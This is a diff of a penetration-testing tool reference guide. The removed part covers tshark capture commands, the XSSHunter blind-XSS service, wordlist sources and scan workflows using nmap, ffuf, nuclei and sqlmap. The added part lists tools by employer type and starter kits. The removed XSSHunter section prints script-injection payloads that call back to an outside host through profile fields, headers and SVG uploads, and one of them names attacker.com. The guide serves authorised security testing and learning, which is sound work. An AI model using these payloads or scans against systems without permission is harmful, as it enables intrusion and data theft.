+- MobSF
+- Burp Suite
+- Postman
+- Windows/macOS (development)
 
-# Windows
-# Download from https://www.wireshark.org/download.html
+### **Security Companies (CrowdStrike, Palo Alto, Cloudflare)**
+**Focus:** Advanced exploitation, threat research, C2
 
-# Verify installation
-wireshark --version
-tshark --version  # Command-line version
-```
+**Primary Tools:**
+- Burp Suite
+- Metasploit
+- Sliver
+- Ghidra
+- AFL++
+- Frida
+- IDA Pro
+- VirtualBox (malware analysis)
+- Windows (primary target OS)
 
-**Basic Usage (GUI):**
+### **Bug Bounty Platforms (HackerOne, Bugcrowd, Synack)**
+**Focus:** Comprehensive web/API/mobile testing
 
-```
-1. Launch Wireshark
-2. Select network interface
-3. Click Start Capturing
-4. Apply display filters
-5. Analyze packets
-6. Stop capture
-7. Save capture file
-```
-
-**Command-Line Usage (tshark):**
-
-```bash
-# List interfaces
-tshark -D
-
-# Capture on specific interface
-sudo tshark -i eth0
-
-# Capture and save to file
-sudo tshark -i eth0 -w capture.pcap
-
-# Capture with filter
-sudo tshark -i eth0 -f "port 80"
-
-# Read from capture file
-tshark -r capture.pcap
-
-# Display specific fields
-tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port
-```
-
-**Advanced Examples:**
-
-```bash
-# Capture only HTTP traffic
-sudo tshark -i eth0 -f "tcp port 80"
-
-# Capture HTTPS traffic
-sudo tshark -i eth0 -f "tcp port 443"
-
-# Display filter (after capture)
-tshark -r capture.pcap -Y "http.request"
-tshark -r capture.pcap -Y "dns"
-tshark -r capture.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0"
-
-# Extract HTTP objects
-tshark -r capture.pcap --export-objects http,./http_objects/
-
-# Follow TCP stream
-tshark -r capture.pcap -z follow,tcp,ascii,0
-
-# Statistics
-tshark -r capture.pcap -z io,stat,1  # IO statistics
-tshark -r capture.pcap -z conv,tcp  # TCP conversations
-tshark -r capture.pcap -z endpoints,tcp  # TCP endpoints
-
-# Decrypt SSL/TLS (with key log file)
-tshark -r capture.pcap -o "tls.keylog_file:sslkeylog.txt" -Y "http"
-
-# Export to CSV
-tshark -r capture.pcap -T fields -E header=y -E separator=, -e frame.time -e ip.src -e ip.dst > output.csv
-
-# Capture for specific duration
-sudo tshark -i eth0 -a duration:60 -w capture.pcap
-
-# Capture specific number of packets
-sudo tshark -i eth0 -c 1000 -w capture.pcap
-
-# Ring buffer (multiple files)
-sudo tshark -i eth0 -b filesize:100000 -b files:5 -w capture.pcap
-```
-
-**Common Display Filters:**
-
-```
-# HTTP
-http
-http.request.method == "POST"
-http.request.uri contains "login"
-
-# DNS
-dns
-dns.qry.name contains "google.com"
-
-# TCP
-tcp.port == 80
-tcp.flags.syn == 1
-
-# IP
-ip.addr == 192.168.1.1
-ip.src == 10.0.0.1
-
-# Follow specific stream
-tcp.stream eq 0
-
-# Search for string
-frame contains "password"
-```
-
-**Integration with Workflow Automation:**
-
-```python
-scanner_commands = {
-    "Wireshark Capture HTTP": r'tshark -i eth0 -f "tcp port 80" -a duration:300 -w "C:\output\http_capture.pcap"',
-    
-    "Wireshark Capture All": r'tshark -i eth0 -a duration:600 -w "C:\output\full_capture.pcap"',
-    
-    "Wireshark Extract HTTP Objects": r'tshark -r "C:\output\capture.pcap" --export-objects http,"C:\output\http_objects"',
-}
-```
+**Primary Tools:**
+- Burp Suite Professional
+- Nuclei
+- Ffuf
+- Amass/Subfinder
+- Katana
+- SQLMap
+- Arjun
+- GAU
+- LinkFinder
+- JADX/APKTool (mobile)
+- ADB
+- Windows + Kali (dual boot)
 
 ---
 
-### XSSHunter
+## 📈 Trending Tools (2023-2024)
 
-**Description:** XSSHunter is a service designed to find blind XSS vulnerabilities by providing a unique payload that calls back to a server when executed.
+**Fastest Growing in Job Postings:**
 
-**Use Cases:**
-- Blind XSS discovery
-- Out-of-band XSS detection
-- DOM-based XSS
-- Stored XSS in admin panels
-- XSS in logs/reports
-
-**Installation:**
-
-```bash
-# XSSHunter Express (self-hosted)
-git clone https://github.com/mandatoryprogrammer/xsshunter-express
-cd xsshunter-express
-
-# Configure
-cp .env.example .env
-# Edit .env with your settings
-
-# Using Docker
-docker-compose up -d
-
-# Manual installation
-npm install
-node server.js
-
-# Public service (deprecated, self-hosting recommended)
-# Use xsshunter.com alternatives or self-host
-```
-
-**Basic Usage:**
-
-```bash
-# 1. Register account on XSSHunter instance
-# 2. Get your unique XSS payload
-# 3. Inject payload in target application
-# 4. Wait for callback when XSS executes
-# 5. Review collected data in dashboard
-```
-
-**Example Payloads:**
-
-```html
-<!-- Basic payload -->
-<script src="https://your-xsshunter.com/uniqueid"></script>
-
-<!-- Image tag payload -->
-<img src=x onerror="var s=document.createElement('script');s.src='https://your-xsshunter.com/uniqueid';document.body.appendChild(s)">
-
-<!-- SVG payload -->
-<svg onload="var s=document.createElement('script');s.src='https://your-xsshunter.com/uniqueid';document.body.appendChild(s)">
-
-<!-- Polyglot payload -->
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-```
-
-**Advanced Examples:**
-
-```bash
-# Test in user profile fields
-First Name: <script src="https://your-xsshunter.com/id"></script>
-Last Name: Normal Name
-Bio: <img src=x onerror='fetch("https://your-xsshunter.com/id")'>
-
-# Test in support tickets
-Subject: Test
-Message: <script src="https://your-xsshunter.com/id"></script>
-
-# Test in file uploads (SVG)
-<svg xmlns="http://www.w3.org/2000/svg" onload="var s=document.createElement('script');s.src='https://your-xsshunter.com/id';document.body.appendChild(s)">
-
-# Test in JSON API
-{"name":"<script src=https://your-xsshunter.com/id></script>"}
-
-# Test in headers
-User-Agent: <script src="https://your-xsshunter.com/id"></script>
-Referer: https://attacker.com"><script src="https://your-xsshunter.com/id"></script>
-```
-
-**Integration with Workflow Automation:**
-
-```python
-# XSSHunter typically used manually
-# But you can integrate payload injection with automated tools
-
-scanner_commands = {
-    "XSS Parameter Injection": r'ffuf -w "C:\payloads\parameters\xss-params.txt" -u "https://target.com/search?FUZZ=<script src=https://your-xsshunter.com/id></script>" -mc 200',
-}
-```
+1. **Nuclei** - 300% increase (ProjectDiscovery ecosystem)
+2. **Sliver** - Open-source C2 gaining traction
+3. **Katana** - New crawler, rapid adoption
+4. **Kiterunner** - API security focus
+5. **Trivy** - Container security boom
+6. **Prowler** - Cloud migration driving demand
+7. **JADX** - Android security emphasis
+8. **ADB** - Mobile testing standardization
+9. **Interactsh** - OOB testing standard
+10. **Frida** - Mobile/dynamic analysis growth
 
 ---
 
-## 📦 Wordlist & Payload Resources
+## 🔑 Quick Start Recommendations
 
-### Essential Wordlist Collections
+### **If you're learning ONE tool:**
+→ Start with **Burp Suite Professional**
 
-**SecLists (Most Comprehensive)**
-```bash
-git clone https://github.com/danielmiessler/SecLists.git
-```
-- Discovery wordlists (DNS, directories, files)
-- Fuzzing payloads (XSS, SQLi, LFI, etc.)
-- Password lists
-- Username lists
-- Parameter names
+### **Building your first toolkit (7 tools):**
+1. Burp Suite
+2. Nmap
+3. Nuclei
+4. Ffuf
+5. SQLMap
+6. Metasploit
+7. Ghidra
 
-**FuzzDB**
-```bash
-git clone https://github.com/fuzzdb-project/fuzzdb.git
-```
-- Attack patterns
-- Discovery patterns
-- Regex patterns
+### **Bug Bounty Starter Kit (12 tools):**
+1. Burp Suite
+2. Nuclei
+3. Ffuf
+4. Katana
+5. Amass/Subfinder
+6. GAU
+7. LinkFinder
+8. SQLMap
+9. Arjun
+10. Interactsh
+11. XSSHunter
+12. Dalfox
 
-**PayloadsAllTheThings**
-```bash
-git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
-```
-- Injection payloads
-- Upload bypasses
-- XXE payloads
-- SSRF payloads
+### **Mobile Security Starter Kit (9 tools):**
+1. Android Studio
+2. ADB (Android Debug Bridge)
+3. JADX
+4. APKTool
+5. Frida
+6. MobSF
+7. Burp Suite
+8. dex2jar
+9. Drozer
 
-**Assetnote Wordlists**
-```bash
-# Download from https://wordlists.assetnote.io/
-```
-- Best-in-class discovery wordlists
-- Curated from real reconnaissance
+### **Cloud Security Starter Kit (7 tools):**
+1. Prowler
+2. ScoutSuite
+3. Trivy
+4. Burp Suite
+5. Nuclei
+6. kube-bench
+7. Snyk
 
-**Nuclei Templates**
-```bash
-# Automatically updated with Nuclei
-nuclei -update-templates
+### **Red Team Starter Kit (8 tools):**
+1. Metasploit
+2. Sliver
+3. Merlin
+4. Burp Suite
+5. Nmap
+6. Bloodhound
+7. Impacket
+8. CrackMapExec
 
-# Or clone manually
-git clone https://github.com/projectdiscovery/nuclei-templates.git
-```
-- CVE templates
-- Misconfiguration templates
-- Exposed panel templates
-- Technology detection templates
+### **Fuzzing Starter Kit (4 tools):**
+1. AFL++
+2. LibFuzzer
+3. Honggfuzz
+4. Radamsa
 
-### Payload Directory Structure
+### **Reverse Engineering Starter Kit (5 tools):**
+1. Ghidra
+2. IDA Pro (or Free)
+3. Frida
+4. JADX (Android)
+5. APKTool (Android)
 
-```
-payloads/
-├── dns/
-│   ├── subdomains-1000.txt
-│   ├── subdomains-10000.txt
-│   └── subdomains-all.txt
-├── directories/
-│   ├── common.txt
-│   ├── directory-list-2.3-medium.txt
-│   ├── raft-large-directories.txt
-│   └── admin-panels.txt
-├── files/
-│   ├── common-files.txt
-│   ├── backup-files.txt
-│   └── raft-large-files.txt
-├── parameters/
-│   ├── common-params.txt
-│   ├── burp-parameter-names.txt
-│   └── arjun-params.txt
-├── fuzzing/
-│   ├── xss-payloads.txt
-│   ├── sqli-payloads.txt
-│   ├── lfi-payloads.txt
-│   ├── rce-payloads.txt
-│   ├── ssrf-payloads.txt
-│   └── xxe-payloads.txt
-├── credentials/
-│   ├── usernames.txt
-│   ├── passwords.txt
-│   └── common-passwords.txt
-├── fuzzer-inputs/
-│   ├── afl-inputs/
-│   ├── honggfuzz-inputs/
-│   └── libfuzzer-corpus/
-└── nuclei-templates/
-    ├── cves/
-    ├── misconfigurations/
-    ├── exposed-panels/
-    └── default-logins/
-```
+### **Essential Lab Setup:**
+1. Windows (Host OS)
+2. VirtualBox
+3. Kali Linux (VM)
+4. Windows 10/11 (Testing VM)
+5. Android Studio + Emulator
 
 ---
 
-## 🔗 Tool Integration Workflows
+## 📚 Tool Categories Summary
 
-### Workflow 1: Web Application Assessment
-
-```python
-scanner_commands = {
-    # Phase 1: Reconnaissance
-    "CT-Exposer Subdomain Enum": "python ct-exposer.py -u -d target.com",
-    "Nmap Port Scan": r'nmap -p- --open -iL "output\domain_output.txt" -oA "output\nmap"',
-    
-    # Phase 2: Directory Discovery
-    "Ffuf Directory Discovery": r'ffuf -w "payloads\directories\common.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403',
-    
-    # Phase 3: Parameter Discovery
-    "Arjun Parameter Discovery": r'arjun -u "https://target.com/api/endpoint" -oJ "output\arjun.json"',
-    "Ffuf Parameter Fuzzing": r'ffuf -w "payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test"',
-    
-    # Phase 4: Vulnerability Testing
-    "Nuclei CVE Scan": r'nuclei -l "output\domain_output.txt" -t cves/ -severity critical,high -o "output\nuclei-cves.txt"',
-    "SQLMap SQL Injection": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5',
-}
-```
-
-### Workflow 2: API Security Testing
-
-```python
-scanner_commands = {
-    "Arjun API Parameter Discovery": r'arjun -u "https://api.target.com/v1/users" -m POST',
-    "Ffuf API Endpoint Discovery": r'ffuf -w "payloads\api\endpoints.txt" -u "https://api.target.com/v1/FUZZ"',
-    "Nuclei API Testing": r'nuclei -u "https://api.target.com" -t apis/ -o "output\nuclei-api.txt"',
-    "SQLMap API Injection": r'sqlmap -u "https://api.target.com/v1/user?id=1" --batch',
-}
-```
-
-### Workflow 3: Binary Fuzzing Campaign
-
-```python
-scanner_commands = {
-    "AFL++ Fuzzing": r'afl-fuzz -i "payloads\afl-inputs" -o "output\afl-crashes" -- target.exe @@',
-    "Honggfuzz Fuzzing": r'honggfuzz -i "payloads\honggfuzz-inputs" -o "output\honggfuzz-crashes" -- target.exe ___FILE___',
-    "LibFuzzer Campaign": r'.\fuzz_target.exe "payloads\libfuzzer-corpus"',
-}
-```
-
-### Workflow 4: Network Security Assessment
-
-```python
-scanner_commands = {
-    "Nmap Service Detection": r'nmap -sV -sC -p- --open target.com -oA "output\nmap-services"',
-    "Nmap Vulnerability Scan": r'nmap --script vuln target.com -oN "output\nmap-vulns.txt"',
-    "Nuclei Network Templates": r'nuclei -u https://target.com -t network/ -o "output\nuclei-network.txt"',
-    "Wireshark Packet Capture": r'tshark -i eth0 -f "host target.com" -a duration:300 -w "output\capture.pcap"',
-}
-```
-
-### Workflow 5: Comprehensive Security Scan
-
-```python
-scanner_commands = {
-    # Reconnaissance
-    "CT-Exposer": "python ct-exposer.py -u -d target.com",
-    "Nmap Full Scan": r'nmap -sV -sC -p- --open -iL "output\domain_output.txt" -oA "output\nmap-full"',
-    
-    # Web Discovery
-    "Ffuf Directories": r'ffuf -w "payloads\directories\directory-list-2.3-medium.txt" -u "https://target.com/FUZZ" -mc 200,301,302,403',
-    "Ffuf Parameters": r'ffuf -w "payloads\parameters\common-params.txt" -u "https://target.com/search?FUZZ=test"',
-    
-    # Vulnerability Scanning
-    "Nuclei Full Scan": r'nuclei -l "output\domain_output.txt" -t nuclei-templates/ -severity critical,high,medium -o "output\nuclei-all.txt"',
-    "Nuclei CVEs": r'nuclei -l "output\domain_output.txt" -t cves/ -o "output\nuclei-cves.txt"',
-    "Nuclei Exposed Panels": r'nuclei -l "output\domain_output.txt" -t exposed-panels/ -o "output\nuclei-panels.txt"',
-    
-    # Targeted Testing
-    "SQLMap Injection": r'sqlmap -u "https://target.com/product?id=1" --batch --risk=3 --level=5',
-}
-```
-
----
-
-## 🎓 Best Practices
-
-### Ethical Hacking Guidelines
-
-1. **Only test authorized targets** - Get written permission
-2. **Respect scope** - Stay within defined boundaries
-3. **Rate limiting** - Don't DoS the target
-4. **Data handling** - Protect sensitive findings
-5. **Responsible disclosure** - Report vulnerabilities properly
-
-### Tool Usage Tips
-
-**Reconnaissance:**
-- Start passive (OSINT, public data)
-- Then active (scanning, probing)
-- Document everything
-
-**Scanning:**
-- Use appropriate rate limits
-- Test during maintenance windows
-- Monitor for blocking/detection
-
-**Exploitation:**
-- Test in isolated environment first
-- Have rollback plan
-- Document steps for reproduction
-
-**Reporting:**
-- Provide clear reproduction steps
-- Include screenshots/proof
-- Suggest remediation
-- Follow disclosure timeline
-
----
-
-## 🚀 Quick Start Guide
-
-### 1. Set Up Environment
-
-```bash
-# Install Kali Linux (VM or WSL)
-wsl --install -d kali-linux
-
-# Update system
-sudo apt update && sudo apt upgrade -y
-
-# Install essential tools
-sudo apt install nmap sqlmap wireshark arjun nuclei -y
-```
-
-### 2. Create Payload Directory
-
-```bash
-mkdir -p ~/payloads/{dns,directories,parameters,fuzzing,credentials}
-cd ~/payloads
-git clone https://github.com/danielmiessler/SecLists.git
-
-# Download Nuclei templates
-nuclei -update-templates
-```
-
-### 3. Run Your First Scan
-
-```bash
-# Subdomain enumeration
-python ct-exposer.py -u -d target.com
-
-# Port scanning
-nmap -sV -sC -p- --open target.com
-
-# Directory discovery
-ffuf -w ~/payloads/SecLists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ
-
-# Vulnerability scanning
-nuclei -u https://target.com -severity critical,high
-```
-
----
-
-## 📚 Learning Resources
-
-### Official Documentation
-- **Nmap**: https://nmap.org/book/
-- **Burp Suite**: https://portswigger.net/burp/documentation
-- **SQLMap**: https://github.com/sqlmapproject/sqlmap/wiki
-- **Wireshark**: https://www.wireshark.org/docs/
-- **Nuclei**: https://docs.projectdiscovery.io/
-- **AFL++**: https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/
-
-### Training Platforms
-- **HackTheBox**: https://www.hackthebox.com/
-- **TryHackMe**: https://tryhackme.com/
-- **PortSwigger Web Security Academy**: https://portswigger.net/web-security
-- **PentesterLab**: https://pentesterlab.com/
-
-### Bug Bounty Platforms
-- **HackerOne**: https://www.hackerone.com/
-- **Bugcrowd**: https://www.bugcrowd.com/
-- **Intigriti**: https://www.intigriti.com/
-- **Synack**: https://www.synack.com/
-
----
-
-## 🤝 Contributing
-
-Help improve this reference guide:
-- Add new tools
-- Update installation instructions
-- Share workflow examples
-- Fix errors or outdated info
-- Add use case examples
-
----
-
-## 📜 License
-
-This reference guide is provided for educational purposes. Always use tools ethically and legally. Unauthorized testing is illegal.
-
----
-
-## ⚠️ Disclaimer
-
-These tools are provided for authorized security testing only. Users are responsible for complying with all applicable laws and regulations. Only test systems you have explicit permission to assess. Unauthorized use is illegal and unethical.
-
----
-
-## 🔗 Additional Resources
-
-- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
-- **SANS Security Resources**: https://www.sans.org/security-resources/
-- **CVE Database**: https://cve.mitre.org/
-- **Exploit Database**: https://www.exploit-db.com/
-- **ProjectDiscovery**: https://projectdiscovery.io/
-
----
-
-**⭐ Star this repo if it helped you in your security research!**
-
-**🐛 Found an error? Open an issue!**
-
-**💡 Have a suggestion? Submit a pull request!**
+| Category | Tool Count | Top Tools |
+|----------|------------|-----------|
+| Network Scanning | 8 | Nmap, Nessus, Wireshark |
+| Subdomain Enum | 5 | Amass, Subfinder, Subjack |
+| Web Crawling | 4 | Katana, GAU, GoSpider |
+| Directory Discovery | 5 | Ffuf, Gobuster, Feroxbuster |
+| Web App Security | 5 | Burp Suite, OWASP ZAP, Nuclei |
+| Parameter Discovery | 2 | Arjun, Kiterunner |
+| API Testing | 4 | Postman, Kiterunner, Insomnia |
+| GraphQL | 3 | InQL, GraphQLmap, CrackQL |
+| SQL Injection | 2 | SQLMap, NoSQLMap |
+| XSS Detection | 3 | XSStrike, XSSHunter, Dalfox |
+| SSRF/OOB | 3 | Interactsh, SSRFmap, Burp Collaborator |
+| JavaScript Analysis | 5 | LinkFinder, JSFinder, SecretFinder |
+| Cloud Security | 6 | Prowler, ScoutSuite, Trivy |
+| Container/K8s | 4 | Trivy, kube-bench, Grype |
+| Dependency Scanning | 4 | Snyk, OWASP Dep-Check, Safety |
+| SAST/DAST | 3 | Checkmarx, Fortify, Veracode |
+| Exploitation/C2 | 4 | Metasploit, Sliver, Merlin, Pacu |
+| Fuzzing | 4 | AFL++, LibFuzzer, Honggfuzz, Radamsa |
+| Mobile Security | 5 | Android Studio, ADB, MobSF, Frida |
+| Android RE | 7 | JADX, APKTool, dex2jar, Androguard |
+| OSINT/Recon | 5 | Recon-ng, theHarvester, Shodan, Maltego |
+| Reverse Engineering | 4 | Ghidra, IDA Pro, Radare2, Hopper |
+| Virtualization/OS | 3 | VirtualBox, Kali Linux, Windows |
+| **Total** | **100** | **Unique Tools** |
 
 ---
